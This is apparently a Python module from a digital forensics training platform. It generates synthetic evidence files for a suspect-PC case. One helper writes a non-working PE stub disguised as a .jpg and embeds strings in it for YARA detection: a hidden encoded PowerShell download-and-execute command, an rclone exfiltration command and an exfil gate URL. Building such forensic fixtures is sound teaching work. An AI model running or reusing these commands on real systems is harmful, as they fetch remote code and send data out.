"""Forensic Case Workspace Builder for Suspect PC Scenario (VAK-2026-084).

Generates real, binary/SQLite-authentic forensic artifacts so every module of the
platform operates on genuine verifiable files right out of the box.
"""

import hashlib
import os
from typing import Any, Dict

from src.ntfs_engine.ntfs_service import create_synthetic_ntfs_image
from src.registry_engine.hive_parser import create_synthetic_registry_hive
from src.registry_engine.windows_artifacts import create_synthetic_windows_artifacts
from src.eventlog_engine.evtx_service import create_synthetic_evtx_file
from src.browser_engine.browser_service import create_synthetic_browser_databases
from src.memory_engine.memory_service import create_synthetic_memory_dump
from src.file_engine.file_service import create_synthetic_exif_jpeg
from src.email_network_engine import create_synthetic_eml_file, create_synthetic_pcap_file


def _create_disguised_pe_payload(path: str) -> None:
    """Create a Windows PE/MZ executable disguised with a .jpg extension and YARA-detectable strings."""
    dos_header = bytearray(0x80)
    dos_header[0:2] = b"MZ"
    dos_header[0x02:0x04] = b"\x90\x00"
    dos_header[0x3C:0x40] = b"\x80\x00\x00\x00"  # e_lfanew = 0x80
    pe_header = b"PE\x00\x00\x64\x86" + (b"\x00" * 32)
    payload_strings = (
        b"\x00powershell.exe -NoP -W Hidden -enc "
        b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\x00"
        b"rclone copy C:\\GizliProjeler remote_exfil:drop\x00"
        b"http://185.220.101.42/exfil/gate.php\x00"
    )
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(bytes(dos_header) + pe_header + payload_strings + (b"\x90" * 256))


def _stream_sha256_sha512(path: str) -> tuple[str, str, int]:
    h256 = hashlib.sha256()
    h512 = hashlib.sha512()
    size = 0
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            h256.update(chunk)
            h512.update(chunk)
            size += len(chunk)
    return h256.hexdigest(), h512.hexdigest(), size


def prepare_suspect_case_workspace(target_dir: str = "examples/suspect_pc_case") -> Dict[str, Any]:
    """Ensure the realistic VAK-2026-084 suspect-PC artifact bundle exists and return exact paths & hashes."""
    os.makedirs(target_dir, exist_ok=True)

    disk_path = os.path.join(target_dir, "suspect_usb_disk.dd")
    hive_path = os.path.join(target_dir, "SYSTEM.hiv")
    evtx_path = os.path.join(target_dir, "Security.evtx")
    arts_dir = os.path.join(target_dir, "windows_artifacts")
    pcap_path = os.path.join(target_dir, "suspect_capture.pcap")
    browser_dir = os.path.join(target_dir, "browser_profile")
    mem_path = os.path.join(target_dir, "suspect_memory.dmp")
    eml_path = os.path.join(target_dir, "exfil_talimat.eml")
    disguised_path = os.path.join(target_dir, "tatil_fatura_ek.jpg")
    exif_a = os.path.join(target_dir, "saha_delil_foto.jpg")
    exif_b = os.path.join(target_dir, "saha_delil_foto_kopya.jpg")

    if not os.path.isfile(disk_path):
        create_synthetic_ntfs_image(disk_path)
    if not os.path.isfile(hive_path):
        create_synthetic_registry_hive(hive_path)
    if not os.path.isfile(evtx_path):
        create_synthetic_evtx_file(evtx_path)

    win_arts = create_synthetic_windows_artifacts(arts_dir)

    if not os.path.isfile(pcap_path):
        create_synthetic_pcap_file(pcap_path)

    bpaths = create_synthetic_browser_databases(browser_dir)

    if not os.path.isfile(mem_path):
        create_synthetic_memory_dump(mem_path)
    if not os.path.isfile(eml_path):
        create_synthetic_eml_file(eml_path)
    if not os.path.isfile(disguised_path):
        _create_disguised_pe_payload(disguised_path)
    if not os.path.isfile(exif_a):
        create_synthetic_exif_jpeg(exif_a)
    if not os.path.isfile(exif_b):
        create_synthetic_exif_jpeg(exif_b)

    disk_sha256, disk_sha512, disk_size = _stream_sha256_sha512(disk_path)

    return {
        "case_dir": target_dir,
        "disk_image": disk_path,
        "disk_sha256": disk_sha256,
        "disk_sha512": disk_sha512,
        "disk_size": disk_size,
        "registry_hive": hive_path,
        "evtx_log": evtx_path,
        "win_artifacts": win_arts,
        "pcap_file": pcap_path,
        "browser_history": bpaths["history"],
        "browser_bookmarks": bpaths["bookmarks"],
        "memory_dump": mem_path,
        "eml_file": eml_path,
        "disguised_payload": disguised_path,
        "exif_photo": exif_a,
    }
